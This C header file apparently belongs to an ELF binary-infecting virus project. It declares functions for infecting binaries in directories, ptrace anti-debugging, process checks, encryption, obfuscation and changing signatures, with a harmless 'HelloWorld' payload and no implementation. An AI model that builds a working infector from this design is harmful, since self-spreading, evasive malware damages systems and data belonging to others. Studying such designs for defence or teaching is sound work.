#ifndef SHELLCODE_H
# define SHELLCODE_H

# define _SYS_WAIT_H
# define _FCNTL_H
# define _SYS_MMAN_H
# define _SIGNAL_H
# include <linux/stat.h>
# include <stddef.h>
# include <sys/types.h>
# include <bits/stat.h>
# include <bits/fcntl.h>
# include <bits/mman.h>
# include <bits/waitflags.h>
# include <bits/waitstatus.h>
# include <bits/signum.h>
# include <dirent.h>
# include <elf.h>

# define BUF_SIZE 1024 * 1024 * 5
# define PAYLOAD "HelloWorld"
# define MAX_INS_SIZE 8

/* Architecture dependent */
enum __ptrace_request {
  PTRACE_TRACEME = 0,
  PTRACE_ATTACH = 16,
  PTRACE_CONT = 7,
};
/* Architecture dependent */

typedef off_t off64_t;
typedef ino_t ino64_t;

struct  linux_dirent64 {
  ino64_t         d_ino;
  off64_t         d_off;
  unsigned short  d_reclen;
  unsigned char   d_type;
  char            d_name[];
};

struct bfile {
  int         fd;
  off_t       size;
  Elf64_Ehdr  *header;
};

static void updateSignature(void);
static void dynamicSignature(void);
static void end(void);
static void lambdaEnd(void);
static void lambdaStart(void);
static void encryptStart(void);
static int  preventDebug(void *magic);
static size_t strlen(const char *s);
static int  checkProcess(char *dirname);
static int  infectBins(const char *dirname);
static void *memcpy(void *dest, const void *src, size_t);
static int  unObfuscate(void);
static int  stop(int status, void *magic);
static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header);
static int  isCompatible(Elf64_Ehdr *header);
static void exit(int status);

#endif
